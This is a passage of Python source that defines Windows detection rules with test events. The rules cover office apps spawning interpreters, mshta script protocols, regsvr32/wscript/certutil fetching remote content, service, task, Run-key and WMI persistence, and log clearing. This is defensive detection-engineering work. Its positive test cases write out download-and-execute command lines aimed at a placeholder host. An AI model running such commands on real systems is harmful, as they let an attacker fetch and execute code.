                CommandLine=P_TEMP_WIN + "synthetic_stage.exe",
                CurrentDirectory=P_TEMP_WIN,
            ),
            case(
                "public_directory",
                "Binary executed from the public profile directory.",
                "Image prefix matches the public directory selection.",
                Image=P_PUBLIC + "synthetic_helper.exe",
                OriginalFileName="synthetic_helper.exe",
                CommandLine=P_PUBLIC + "synthetic_helper.exe",
            ),
        ],
        neg=[
            case(
                "managed_program_files",
                "Application executed from a managed installation directory.",
                "Image prefix is outside every user-writable selection.",
                Image=P_PROG + "SyntheticApp\\synthetic_app.exe",
                CommandLine="synthetic_app.exe --start",
            ),
            case(
                "allowed_patch_installer",
                "Approved patch installer executed from the temporary directory.",
                "Path matches the selection but the approved installer filter removes it.",
                Image=P_TEMP_USER + "synthetic_patch_installer.exe",
                CommandLine=P_TEMP_USER + "synthetic_patch_installer.exe /quiet",
            ),
            case(
                "system_directory_binary",
                "System utility executed from the system directory.",
                "Image prefix is the system directory, which is not user writable.",
                Image=P_SYS32 + "cmd.exe",
                CommandLine="cmd.exe /c echo synthetic",
            ),
            case(
                "temp_named_subdirectory_elsewhere",
                "Binary executed from a managed directory that merely contains the word Temp.",
                "The selection uses startswith, so a similarly named managed path is excluded.",
                Image=P_PROG + "SyntheticApp\\TempCache\\synthetic_worker.exe",
                CommandLine="synthetic_worker.exe",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-002",
        family="windows",
        path="windows/process_creation",
        file="office_like_parent_spawning_command_interpreter.yml",
        title="Office-Like Application Spawning A Command Interpreter",
        level="high",
        profile="win_process_creation",
        desc=(
            "Detects a synthetic office-suite process creating a command interpreter or script "
            "host child process. Document applications rarely need to launch an interpreter, so "
            "this parent and child combination is a high-confidence indicator of macro or "
            "template driven execution."
        ),
        hypothesis=(
            "If macro or template content executes, the interpreter process will retain the "
            "document application as its parent image."
        ),
        techniques=["T1059.003"],
        extra_techniques=["T1204.002"],
        refs=[attack_url("T1059.003"), attack_url("T1204.002"), MS_SYSMON],
        detection=[
            ("selection_office_parent", [("ParentImage|endswith", list(OFFICE_PARENTS))]),
            (
                "selection_interpreter_child",
                [
                    (
                        "Image|endswith",
                        [
                            "\\cmd.exe",
                            "\\powershell.exe",
                            "\\pwsh.exe",
                            "\\wscript.exe",
                            "\\cscript.exe",
                            "\\mshta.exe",
                        ],
                    )
                ],
            ),
        ],
        condition="selection_office_parent and selection_interpreter_child",
        fps=[
            "Approved document automation templates in finance or reporting teams that shell out "
            "to a signed helper script during month-end close.",
            "Add-in installation routines that call the command interpreter once immediately "
            "after an office application update.",
            "Software distribution packages that repackage office automation and briefly launch "
            "cscript to register components.",
        ],
        fp_strategy=(
            "Benign matches are usually repeatable, tied to a specific document path or add-in, "
            "and executed by a small set of business users. Tune with the child command line and "
            "the invoking document rather than removing the parent process."
        ),
        tuning=(
            "Add narrow CommandLine exclusions for the exact automation script path. Never "
            "exclude an entire office parent image, because that disables the rule for all "
            "documents on the endpoint."
        ),
        test_strategy=(
            "Positive cases pair each office-like parent with a different interpreter child. "
            "Negative cases keep one half of the pair benign so that both selections are "
            "exercised independently."
        ),
        volume="Low in most environments; noticeable in finance teams with macro workflows.",
        related=["SDEL-PS-010", "SDEL-WIN-015"],
        pos=[
            case(
                "word_like_parent_spawns_cmd",
                "Synthetic word processor launches the command interpreter.",
                "Both selections match: office parent and cmd child.",
                ParentImage=P_PROG + "SyntheticOffice\\synthetic_word.exe",
                ParentCommandLine="synthetic_word.exe " + P_USERDIR + "Documents\\synthetic_report.docx",
                Image=P_SYS32 + "cmd.exe",
                CommandLine="cmd.exe /c echo synthetic-placeholder",
            ),
            case(
                "excel_like_parent_spawns_powershell",
                "Synthetic spreadsheet application launches PowerShell.",
                "Both selections match: office parent and powershell child.",
                ParentImage=P_PROG + "SyntheticOffice\\synthetic_excel.exe",
                ParentCommandLine="synthetic_excel.exe " + P_USERDIR + "Documents\\synthetic_budget.xlsx",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -NoProfile -Command Write-Output 'synthetic'",
            ),
        ],
        neg=[
            case(
                "office_parent_spawns_updater",
                "Office application launches its own updater process.",
                "Parent matches but the child is not an interpreter.",
                ParentImage=P_PROG + "SyntheticOffice\\synthetic_word.exe",
                Image=P_PROG + "SyntheticOffice\\synthetic_office_update.exe",
                CommandLine="synthetic_office_update.exe /check",
            ),
            case(
                "explorer_parent_spawns_cmd",
                "Interactive user launches the command interpreter from the shell.",
                "Child matches but the parent is not an office-like application.",
                ParentImage="C:\\Synthetic\\Windows\\explorer.exe",
                Image=P_SYS32 + "cmd.exe",
                CommandLine="cmd.exe",
            ),
            case(
                "office_parent_spawns_printer_helper",
                "Office application launches a printing helper.",
                "Neither the child image nor its command line matches the interpreter selection.",
                ParentImage=P_PROG + "SyntheticOffice\\synthetic_excel.exe",
                Image=P_PROG + "SyntheticPrint\\synthetic_print_helper.exe",
                CommandLine="synthetic_print_helper.exe /spool",
            ),
            case(
                "service_host_spawns_cscript",
                "Scheduled maintenance service launches a script host.",
                "Child matches but the parent is a service host, not an office application.",
                ParentImage=P_SYS32 + "svchost.exe",
                Image=P_SYS32 + "cscript.exe",
                CommandLine="cscript.exe " + P_PROG + "SyntheticAgent\\inventory.vbs",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-003",
        family="windows",
        path="windows/defense_evasion",
        file="signed_utility_script_protocol_reference.yml",
        title="Signed Windows Utility Referencing A Script Protocol Handler",
        level="high",
        profile="win_process_creation",
        desc=(
            "Detects the HTML application host being invoked with an inline script protocol "
            "handler. Passing script protocol text directly on the command line lets a signed "
            "system binary execute attacker-controlled logic without writing a script file."
        ),
        hypothesis=(
            "If a signed script-capable utility is used as an execution proxy, the command line "
            "will contain an inline script protocol prefix instead of a file path."
        ),
        techniques=["T1218.005"],
        refs=[attack_url("T1218.005"), MS_WINCMD],
        detection=[
            ("selection_script_host", [("Image|endswith", ["\\mshta.exe"])]),
            (
                "selection_script_protocol",
                [("CommandLine|contains", ["javascript:", "vbscript:", "about:"])],
            ),
        ],
        condition="selection_script_host and selection_script_protocol",
        fps=[
            "Legacy internal line-of-business applications that still ship HTML application "
            "front-ends and launch them through an inline protocol handler.",
            "Vendor diagnostic tooling for older management consoles that renders status pages "
            "through the HTML application host.",
        ],
        fp_strategy=(
            "Legacy internal applications are the dominant benign source. Identify them by the "
            "invoking parent process and by the stable script text, then exclude that exact "
            "combination instead of the whole utility."
        ),
        tuning=(
            "Scope exclusions with both ParentImage and a distinctive command-line substring. "
            "Excluding mshta.exe outright removes coverage for the entire proxy execution "
            "technique."
        ),
        test_strategy=(
            "Positive cases cover the javascript and vbscript protocol prefixes. Negative cases "
            "cover a local HTML application file, a different utility using the same protocol "
            "text, and an unrelated system binary."
        ),
        volume="Very low on modern estates; occasional on hosts running legacy tooling.",
        related=["SDEL-WIN-004", "SDEL-WIN-016"],
        pos=[
            case(
                "javascript_protocol",
                "HTML application host invoked with an inline javascript protocol placeholder.",
                "Image and protocol selections both match.",
                Image=P_SYS32 + "mshta.exe",
                OriginalFileName="MSHTA.EXE",
                CommandLine=f'mshta.exe "javascript:{ENC_PLACEHOLDER}"',
                ParentImage=P_SYS32 + "cmd.exe",
            ),
            case(
                "vbscript_protocol",
                "HTML application host invoked with an inline vbscript protocol placeholder.",
                "Image and protocol selections both match.",
                Image=P_SYS32 + "mshta.exe",
                OriginalFileName="MSHTA.EXE",
                CommandLine=f'mshta.exe "vbscript:{ENC_PLACEHOLDER}"',
                ParentImage=P_SYS32 + "cmd.exe",
            ),
        ],
        neg=[
            case(
                "local_hta_file",
                "HTML application host opening a local application file.",
                "Image matches but no inline script protocol is present.",
                Image=P_SYS32 + "mshta.exe",
                CommandLine="mshta.exe " + P_PROG + "SyntheticLegacy\\console.hta",
            ),
            case(
                "browser_protocol_argument",
                "Browser started with a protocol argument.",
                "Protocol text matches but the image is not the script host.",
                Image=P_PROG + "SyntheticBrowser\\synthetic_browser.exe",
                CommandLine='synthetic_browser.exe "about:blank"',
            ),
            case(
                "unrelated_system_binary",
                "System utility executed with ordinary arguments.",
                "Neither selection matches.",
                Image=P_SYS32 + "ipconfig.exe",
                CommandLine="ipconfig.exe /all",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-004",
        family="windows",
        path="windows/defense_evasion",
        file="script_capable_utility_remote_content_reference.yml",
        title="Script-Capable Windows Utility Referencing Remote Content",
        level="high",
        profile="win_process_creation",
        desc=(
            "Detects script-capable signed Windows utilities being pointed at a remote HTTP or "
            "HTTPS location. These binaries are normally used against local files, so a remote "
            "reference indicates the utility is being used to retrieve and execute external "
            "content."
        ),
        hypothesis=(
            "If a signed script-capable utility is used to pull remote content, the command line "
            "will contain a URL scheme rather than a local path."
        ),
        techniques=["T1105"],
        extra_techniques=["T1218.010"],
        refs=[attack_url("T1105"), attack_url("T1218.010"), MS_WINCMD],
        detection=[
            (
                "selection_script_utility",
                [
                    (
                        "Image|endswith",
                        [
                            "\\mshta.exe",
                            "\\wscript.exe",
                            "\\cscript.exe",
                            "\\regsvr32.exe",
                            "\\rundll32.exe",
                        ],
                    )
                ],
            ),
            ("selection_remote_scheme", [("CommandLine|contains", ["http://", "https://"])]),
        ],
        condition="selection_script_utility and selection_remote_scheme",
        fps=[
            "Component registration performed by an internal deployment tool that passes a "
            "package URL to the registration utility during application rollout.",
            "Vendor support scripts that fetch a diagnostic manifest over HTTPS from an internal "
            "software distribution point.",
        ],
        fp_strategy=(
            "Benign matches point at internal distribution hosts and repeat on a predictable "
            "schedule. Tune on the destination host portion of the command line combined with "
            "the parent deployment process."
        ),
        tuning=(
            "Exclude the specific internal distribution hostname rather than the URL scheme. "
            "Removing the https prefix from the selection would defeat the rule."
        ),
        test_strategy=(
            "Positive cases exercise two different utilities with remote references. Negative "
            "cases keep the same utilities on local paths and add a non-matching browser."
        ),
        volume="Low; spikes during application deployment campaigns.",
        related=["SDEL-WIN-003", "SDEL-WIN-005", "SDEL-WIN-016"],
        pos=[
            case(
                "component_registration_remote",
                "Component registration utility pointed at a synthetic remote location.",
                "Utility image and remote scheme selections both match.",
                Image=P_SYS32 + "regsvr32.exe",
                OriginalFileName="REGSVR32.EXE",
                CommandLine=f"regsvr32.exe /s /u /i:{SYNTH_URL}/component.xml scrobj.dll",
                ParentImage=P_SYS32 + "cmd.exe",
            ),
            case(
                "script_host_remote",
                "Script host pointed at a synthetic remote location.",
                "Utility image and remote scheme selections both match.",
                Image=P_SYS32 + "wscript.exe",
                OriginalFileName="wscript.exe",
                CommandLine=f"wscript.exe {SYNTH_URL}/loader.js",
                ParentImage=P_SYS32 + "cmd.exe",
            ),
        ],
        neg=[
            case(
                "local_component_registration",
                "Component registration utility used against a local library.",
                "Utility matches but there is no remote scheme.",
                Image=P_SYS32 + "regsvr32.exe",
                CommandLine="regsvr32.exe /s " + P_PROG + "SyntheticApp\\synthetic_component.dll",
            ),
            case(
                "browser_opens_url",
                "Browser opens a synthetic URL.",
                "Remote scheme matches but the image is not a script-capable utility.",
                Image=P_PROG + "SyntheticBrowser\\synthetic_browser.exe",
                CommandLine=f"synthetic_browser.exe {SYNTH_URL}/page",
            ),
            case(
                "script_host_local_file",
                "Script host executes an approved local inventory script.",
                "Utility matches but the argument is a local path.",
                Image=P_SYS32 + "cscript.exe",
                CommandLine="cscript.exe " + P_PROG + "SyntheticAgent\\inventory.vbs",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-005",
        family="windows",
        path="windows/defense_evasion",
        file="certificate_utility_transfer_or_decode_options.yml",
        title="Certificate Utility Invoked With Transfer Or Decoding Options",
        level="medium",
        profile="win_process_creation",
        desc=(
            "Detects the Windows certificate utility being used with its download cache or "
            "encoding conversion options. Those options turn a certificate management tool into "
            "a general purpose file transfer and decoding utility."
        ),
        hypothesis=(
            "If the certificate utility is repurposed for transfer or decoding, its command line "
            "will contain the URL cache or encode and decode switches."
        ),
        techniques=["T1105"],
        extra_techniques=["T1140"],
        refs=[attack_url("T1105"), attack_url("T1140"), MS_CERTUTIL],
        detection=[
            ("selection_certificate_utility", [("Image|endswith", "\\certutil.exe")]),
            (
                "selection_transfer_or_decode",
                [("CommandLine|contains", ["-urlcache", "-decode", "-encode", "-verifyctl"])],
            ),
        ],
        condition="selection_certificate_utility and selection_transfer_or_decode",
        fps=[
            "Certificate lifecycle automation that encodes and decodes certificate signing "
            "requests between binary and base64 form during renewal jobs.",
            "Public key infrastructure administrators verifying certificate trust lists during "
            "scheduled trust store maintenance.",
        ],
        fp_strategy=(
            "Benign matches come from certificate automation accounts on a small number of "
            "hosts. Tune with the invoking account and the certificate file path, and keep the "
            "URL cache option unfiltered."
        ),
        tuning=(
            "Exclude the specific certificate automation service account on the enrolment "
            "servers only. Do not exclude the decode option globally, since it is the primary "
            "payload staging path for this utility."
        ),
        test_strategy=(
            "Positive cases exercise the transfer option and the decode option. Negative cases "
            "keep the utility on ordinary store operations and use another binary with a "
            "similar switch."
        ),
        volume="Low; concentrated on certificate infrastructure hosts.",
        related=["SDEL-WIN-004", "SDEL-WIN-016"],
        pos=[
            case(
                "url_cache_transfer",
                "Certificate utility used to retrieve a synthetic remote file.",
                "Image and transfer option selections both match.",
                Image=P_SYS32 + "certutil.exe",
                OriginalFileName="CertUtil.exe",
                CommandLine=(
                    f"certutil.exe -urlcache -split -f {SYNTH_URL}/payload.txt "
                    + P_TEMP_WIN
                    + "synthetic_download.txt"
                ),
            ),
            case(
                "base64_decode",
                "Certificate utility used to decode a synthetic placeholder file.",
                "Image and decode option selections both match.",
                Image=P_SYS32 + "certutil.exe",
                OriginalFileName="CertUtil.exe",
                CommandLine=(
                    "certutil.exe -decode "
                    + P_TEMP_WIN
                    + "synthetic_input.txt "
                    + P_TEMP_WIN
                    + "synthetic_output.bin"
                ),
            ),
        ],
        neg=[
            case(
                "certificate_store_listing",
                "Certificate utility listing the personal certificate store.",
                "Image matches but no transfer or decoding option is present.",
                Image=P_SYS32 + "certutil.exe",
                CommandLine="certutil.exe -store my",
            ),
            case(
                "other_tool_decode_switch",
                "Unrelated helper using a similarly named switch.",
                "Option text matches but the image is not the certificate utility.",
                Image=P_PROG + "SyntheticApp\\synthetic_convert.exe",
                CommandLine="synthetic_convert.exe -decode " + P_TEMP_WIN + "synthetic_input.txt",
            ),
            case(
                "certificate_template_query",
                "Certificate utility queried for template information.",
                "Image matches but the option list does not.",
                Image=P_SYS32 + "certutil.exe",
                CommandLine="certutil.exe -template",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-006",
        family="windows",
        path="windows/persistence",
        file="service_created_referencing_user_writable_path.yml",
        title="Windows Service Created Referencing A User-Writable Path",
        level="high",
        profile="win_system",
        desc=(
            "Detects a service installation whose image path points into a user-writable "
            "temporary or public directory. Services normally run from managed program "
            "directories, so a user-writable service binary is both a persistence mechanism and "
            "a privilege escalation opportunity."
        ),
        hypothesis=(
            "If persistence is installed as a service, the Service Control Manager installation "
            "event will record an image path in a directory writable by non-administrative "
            "users."
        ),
        techniques=["T1543.003"],
        refs=[attack_url("T1543.003"), MS_SCM],
        detection=[
            (
                "selection_service_installed",
                [("EventID", 7045), ("Provider_Name", "Service Control Manager")],
            ),
            ("selection_writable_image_path", [("ImagePath|contains", list(TEMP_FRAGMENTS))]),
        ],
        condition="selection_service_installed and selection_writable_image_path",
        fps=[
            "Vendor installers that register a temporary bootstrap service from the extraction "
            "directory and remove it at the end of the installation.",
            "Endpoint management remediation packages that install a short-lived service from "
            "the Windows temporary directory during a maintenance window.",
        ],
        fp_strategy=(
            "Benign matches are short lived, appear during change windows, and use predictable "
            "service names. Tune on ServiceName combined with the maintenance window rather "
            "than on the path fragment."
        ),
        tuning=(
            "Exclude specific ServiceName values used by approved installers. Do not exclude the "
            "temporary directory fragments, because they are the core of the detection."
        ),
        test_strategy=(
            "Positive cases install services from the machine temporary directory and the public "
            "directory. Negative cases use a managed program directory, a non-service event, and "
            "a different provider."
        ),
        volume="Very low; each match warrants review.",
        related=["SDEL-COR-005", "SDEL-WIN-007"],
        pos=[
            case(
                "service_from_windows_temp",
                "Service installed from the machine temporary directory.",
                "Installation event and writable path selections both match.",
                ServiceName="SyntheticStagedService",
                ImagePath=P_TEMP_WIN + "synthetic_service.exe",
                StartType="auto start",
            ),
            case(
                "service_from_public_directory",
                "Service installed from the public profile directory.",
                "Installation event and writable path selections both match.",
                ServiceName="SyntheticPublicService",
                ImagePath=P_PUBLIC + "synthetic_service.exe",
                StartType="demand start",
            ),
        ],
        neg=[
            case(
                "managed_service_path",
                "Service installed from a managed program directory.",
                "Installation event matches but the path is not user writable.",
                ServiceName="SyntheticInventoryAgent",
                ImagePath=P_PROG + "SyntheticAgent\\synthetic_agent.exe",
            ),
            case(
                "service_start_failure_event",
                "Service failed to start.",
                "Path fragment matches but the event identifier is not a service installation.",
                EventID=7000,
                ServiceName="SyntheticStagedService",
                ImagePath=P_TEMP_WIN + "synthetic_service.exe",
            ),
            case(
                "driver_load_other_provider",
                "Kernel filter driver reported by another provider.",
                "Path fragment matches but the provider is not Service Control Manager.",
                Provider_Name="Microsoft-Windows-Kernel-PnP",
                EventID=7045,
                ImagePath=P_TEMP_WIN + "synthetic_driver.sys",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-007",
        family="windows",
        path="windows/persistence",
        file="scheduled_task_action_referencing_temp_path.yml",
        title="Scheduled Task Created With An Action In A Temporary Path",
        level="medium",
        profile="win_security",
        desc=(
            "Detects scheduled task creation where the task definition references an executable "
            "in a user-writable temporary or public directory. Scheduled tasks are a durable "
            "persistence mechanism and a task action outside managed directories is unusual."
        ),
        hypothesis=(
            "If persistence is installed through the task scheduler, the task registration event "
            "will contain an action path rooted in a user-writable directory."
        ),
        techniques=["T1053.005"],
        refs=[attack_url("T1053.005"), ms_event(4698), MS_SCHTASKS],
        detection=[
            ("selection_task_registered", [("EventID", 4698)]),
            ("selection_temp_action", [("TaskContent|contains", list(TEMP_FRAGMENTS))]),
        ],
        condition="selection_task_registered and selection_temp_action",
        fps=[
            "Software installers that register a one-time cleanup task pointing at their own "
            "extraction directory under the Windows temporary path.",
            "Patch orchestration tooling that schedules a post-reboot verification task from a "
            "staging directory in the public profile.",
        ],
        fp_strategy=(
            "Benign matches occur during change windows and use vendor-specific task names. "
            "Tune on TaskName plus the registering account rather than on the path fragment."
        ),
        tuning=(
            "Exclude named vendor cleanup tasks only. Removing the temporary path fragments "
            "would leave the rule without any selective power."
        ),
        test_strategy=(
            "Positive cases register tasks with actions in the per-user and machine temporary "
            "directories. Negative cases use a managed action path, a task deletion event, and a "
            "task whose description merely mentions a temporary directory."
        ),
        volume="Low; a handful of matches per change window.",
        related=["SDEL-WIN-006", "SDEL-PS-008"],
        pos=[
            case(
                "task_action_user_temp",
                "Task registered with an action in the per-user temporary directory.",
                "Registration event and action path selections both match.",
                EventID=4698,
                TaskName="\\SyntheticStagedTask",
                TaskContent=(
                    "<Actions><Exec><Command>"
                    + P_TEMP_USER
                    + "synthetic_task.exe</Command></Exec></Actions>"
                ),
                SubjectUserName=USER_STD,
                Computer=HOST_WIN,
            ),
            case(
                "task_action_windows_temp",
                "Task registered with an action in the machine temporary directory.",
                "Registration event and action path selections both match.",
                EventID=4698,
                TaskName="\\SyntheticMachineTask",
                TaskContent=(
                    "<Actions><Exec><Command>"
                    + P_TEMP_WIN
                    + "synthetic_task.exe</Command></Exec></Actions>"
                ),
                SubjectUserName=USER_ADM,
                Computer=HOST_WIN,
            ),
        ],
        neg=[
            case(
                "task_action_managed_path",
                "Task registered with an action in a managed program directory.",
                "Registration event matches but the action path is not user writable.",
                EventID=4698,
                TaskName="\\SyntheticInventoryTask",
                TaskContent=(
                    "<Actions><Exec><Command>"
                    + P_PROG
                    + "SyntheticAgent\\inventory.exe</Command></Exec></Actions>"
                ),
                Computer=HOST_WIN,
            ),
            case(
                "task_deleted_event",
                "Scheduled task deleted.",
                "Path fragment matches but the event identifier is a deletion, not a creation.",
                EventID=4699,
                TaskName="\\SyntheticStagedTask",
                TaskContent=(
                    "<Actions><Exec><Command>"
                    + P_TEMP_USER
                    + "synthetic_task.exe</Command></Exec></Actions>"
                ),
                Computer=HOST_WIN,
            ),
            case(
                "task_description_mentions_temp",
                "Task registered whose description text mentions temporary files.",
                "The description does not contain a matching path fragment, so no selection hits.",
                EventID=4698,
                TaskName="\\SyntheticCleanupTask",
                TaskContent=(
                    "<Description>Removes stale temporary files</Description>"
                    "<Actions><Exec><Command>"
                    + P_SYS32
                    + "cleanmgr.exe</Command></Exec></Actions>"
                ),
                Computer=HOST_WIN,
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-008",
        family="windows",
        path="windows/persistence",
        file="run_key_persistence_user_writable_path.yml",
        title="Run Or RunOnce Value Referencing A User-Writable Path",
        level="medium",
        profile="win_registry_set",
        desc=(
            "Detects a Run or RunOnce autostart value being written with data that points into a "
            "user-writable temporary or public directory. Legitimate autostart entries normally "
            "reference managed installation directories."
        ),
        hypothesis=(
            "If logon persistence is installed, a Run or RunOnce value will be written whose "
            "data references a directory that any interactive user can modify."
        ),
        techniques=["T1547.001"],
        extra_techniques=["T1112"],
        refs=[attack_url("T1547.001"), MS_REG_RUN, MS_SYSMON],
        detection=[
            (
                "selection_autostart_key",
                [
                    (
                        "TargetObject|contains",
                        [
                            "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\",
                            "\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\",
                        ],
                    )
                ],
            ),
            ("selection_writable_value", [("Details|contains", list(TEMP_FRAGMENTS))]),
        ],
        condition="selection_autostart_key and selection_writable_value",
        fps=[
            "Installer bootstrappers that write a RunOnce value pointing at their extraction "
            "directory so that setup resumes after a reboot.",
            "Driver update packages that stage a post-reboot finalisation binary in the Windows "
            "temporary directory and register it under RunOnce.",
        ],
        fp_strategy=(
            "Benign matches are almost always RunOnce values written during installation and "
            "removed on the next logon. Tune with the writing process image and the value name "
            "instead of the path fragment."
        ),
        tuning=(
            "Exclude the specific installer image writing the value, and prefer keeping Run "
            "entries unfiltered even when RunOnce entries are tuned."
        ),
        test_strategy=(
            "Positive cases write Run and RunOnce values pointing at temporary directories. "
            "Negative cases cover a managed autostart target, an unrelated key, and a "
            "settings value."
        ),
        volume="Low; each match should resolve to an installer or an investigation.",
        related=["SDEL-WIN-001", "SDEL-WIN-014"],
        pos=[
            case(
                "run_value_user_temp",
                "Run value written referencing the per-user temporary directory.",
                "Autostart key and writable value selections both match.",
                TargetObject=(
                    "HKU\\S-1-5-21-SYNTHETIC\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                    "SyntheticHelper"
                ),
                Details=P_TEMP_USER + "synthetic_helper.exe",
                Image=P_SYS32 + "reg.exe",
            ),
            case(
                "runonce_value_public",
                "RunOnce value written referencing the public profile directory.",
                "Autostart key and writable value selections both match.",
                TargetObject=(
                    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\SyntheticStage"
                ),
                Details=P_PUBLIC + "synthetic_stage.exe",
                Image=P_SYS32 + "cmd.exe",
            ),
        ],
        neg=[
            case(
                "run_value_managed_path",
                "Run value written referencing a managed program directory.",
                "Autostart key matches but the value data is not user writable.",
                TargetObject=(
                    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SyntheticAgent"
                ),
                Details=P_PROG + "SyntheticAgent\\synthetic_agent.exe",
            ),
            case(
                "application_setting_temp_path",
                "Application setting written referencing a temporary cache directory.",
                "Value data matches but the key is not an autostart location.",
                TargetObject=(
                    "HKU\\S-1-5-21-SYNTHETIC\\Software\\SyntheticApp\\Settings\\CachePath"
                ),
                Details=P_TEMP_USER + "cache",
            ),
            case(
                "run_key_read_only_theme",
                "Unrelated appearance setting written.",
                "Neither selection matches.",
                TargetObject="HKU\\S-1-5-21-SYNTHETIC\\Software\\SyntheticApp\\Settings\\Theme",
                Details="light",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-009",
        family="windows",
        path="windows/persistence",
        file="permanent_wmi_event_subscription_created.yml",
        title="Permanent WMI Event Subscription Component Created",
        level="medium",
        profile="win_wmi_event",
        desc=(
            "Detects creation of a permanent WMI event subscription component, that is an event "
            "filter, a consumer, or the binding that links them. Permanent subscriptions survive "
            "reboot and execute without a scheduled task or service entry."
        ),
        hypothesis=(
            "If WMI is used for persistence, a filter, consumer, or binding creation record will "
            "appear in the subscription telemetry."
        ),
        techniques=["T1546.003"],
        refs=[attack_url("T1546.003"), MS_WMI_SUB, MS_SYSMON],
        detection=[
            (
                "selection_subscription_component",
                [
                    (
                        "EventType",
                        ["WmiFilterEvent", "WmiConsumerEvent", "WmiBindingEvent"],
                    ),
                    ("Operation", "Created"),
                ],
            )
        ],
        condition="selection_subscription_component",
        fps=[
            "Systems management platforms that register inventory subscriptions on agent "
            "installation and re-register them after an agent upgrade.",
            "Hardware monitoring suites that create consumer bindings for thermal and disk "
            "health events on server builds.",
        ],
        fp_strategy=(
            "Benign subscriptions come from a small, stable set of management products and use "
            "recognisable filter names. Tune on the Name and Consumer values, and keep the "
            "creation operation itself unfiltered."
        ),
        tuning=(
            "Exclude specific management subscription names on the hosts where that product is "
            "installed. Broad exclusion of the binding event type removes the highest-value "
            "record in this family."
        ),
        test_strategy=(
            "Positive cases create a filter and a binding. Negative cases cover deletion, a "
            "non-subscription event type, and a query-only record."
        ),
        volume="Very low outside management server builds.",
        related=["SDEL-WIN-006"],
        pos=[
            case(
                "filter_created",
                "WMI event filter created.",
                "Event type and creation operation both match.",
                EventType="WmiFilterEvent",
                Operation="Created",
                Name="SyntheticPersistenceFilter",
                Query="SELECT * FROM SyntheticTimerEvent",
            ),
            case(
                "binding_created",
                "WMI filter to consumer binding created.",
                "Event type and creation operation both match.",
                EventType="WmiBindingEvent",
                Operation="Created",
                Consumer="SyntheticPersistenceConsumer",
                Filter="SyntheticPersistenceFilter",
            ),
        ],
        neg=[
            case(
                "filter_deleted",
                "WMI event filter removed during agent uninstall.",
                "Event type matches but the operation is a deletion.",
                EventType="WmiFilterEvent",
                Operation="Deleted",
                Name="SyntheticInventoryFilter",
            ),
            case(
                "wmi_query_only",
                "Ordinary WMI query executed by an inventory tool.",
                "Event type is not a subscription component.",
                EventType="WmiQueryEvent",
                Operation="Executed",
                Query="SELECT * FROM SyntheticInventoryClass",
            ),
            case(
                "consumer_deleted",
                "WMI consumer removed during cleanup.",
                "Event type matches but the operation is a deletion.",
                EventType="WmiConsumerEvent",
                Operation="Deleted",
                Consumer="SyntheticInventoryConsumer",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-010",
        family="windows",
        path="windows/defense_evasion",
        file="windows_security_event_log_cleared.yml",
        title="Windows Security Event Log Cleared",
        level="high",
        profile="win_security",
        desc=(
            "Detects the audit log clear record raised when the Windows Security event log is "
            "purged. Clearing the Security log destroys the primary source of identity and "
            "process evidence on the host."
        ),
        hypothesis=(
            "If an operator or adversary clears the Security log, the Security channel will "
            "contain the dedicated log-clear record even though the previous entries are gone."
        ),
        techniques=["T1685.005"],
        refs=[attack_url("T1685.005"), ms_event(1102)],
        detection=[
            ("selection_log_cleared", [("EventID", 1102), ("Channel", "Security")]),
        ],
        condition="selection_log_cleared",
        fps=[
            "Golden image preparation and sysprep runs that clear event logs before a machine "
            "template is captured.",
            "Forensic or support procedures that intentionally clear logs after an approved "
            "evidence export on a rebuilt host.",
        ],
        fp_strategy=(
            "Benign clears happen on build and imaging hosts, performed by imaging service "
            "accounts, and correlate with a machine rebuild. Tune with the host role and the "
            "subject account rather than suppressing the event."
        ),
        tuning=(
            "Restrict any exclusion to the imaging build hosts and the imaging service account. "
            "Never exclude this event across the production estate."
        ),
        test_strategy=(
            "Positive cases clear the log from two different accounts. Negative cases use a "
            "different event identifier, a different channel, and an ordinary logon record."
        ),
        volume="Rare; every production match deserves triage.",
        related=["SDEL-ID-011", "SDEL-LX-009"],
        pos=[
            case(
                "cleared_by_admin",
                "Security log cleared by a synthetic administrator.",
                "Event identifier and channel selections both match.",
                EventID=1102,
                Channel="Security",
                SubjectUserName=USER_ADM,
                Computer=HOST_WIN,
            ),
            case(
                "cleared_on_domain_controller",
                "Security log cleared on the synthetic domain controller.",
                "Event identifier and channel selections both match.",
                EventID=1102,
                Channel="Security",
                SubjectUserName=USER_SVC,
                Computer=HOST_DC,
            ),
        ],
        neg=[
            case(
                "system_log_cleared",
                "System log cleared, recorded on the System channel.",
                "Channel does not match the Security selection.",
                EventID=104,
                Channel="System",
                SubjectUserName=USER_ADM,
            ),
            case(
                "audit_policy_changed",
                "Audit policy changed on the same host.",
                "Event identifier does not match.",
                EventID=4719,
                Channel="Security",
                SubjectUserName=USER_ADM,
            ),
            case(
                "successful_logon",
                "Ordinary interactive logon.",
                "Neither the identifier nor the semantics match.",
                EventID=4624,
                Channel="Security",
                TargetUserName=USER_STD,
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-011",
        family="windows",
        path="windows/defense_evasion",
        file="security_product_configuration_weakening.yml",
        title="Command Line Weakening Endpoint Security Product Configuration",
        level="high",
        profile="win_process_creation",
        desc=(
            "Detects command lines that disable real-time protection or behaviour monitoring "
            "features of the endpoint security product. The rule inspects command-line metadata "
            "only and does not describe how to defeat any control."
        ),
        hypothesis=(
            "If protective controls are being weakened before further activity, a process "
            "creation event will show configuration switches that turn monitoring features off."
        ),
        techniques=["T1685"],
        refs=[attack_url("T1685"), MS_MPPREF],
        detection=[
            (
                "selection_config_tool",
                [
                    (
                        "Image|endswith",
                        [
                            "\\powershell.exe",
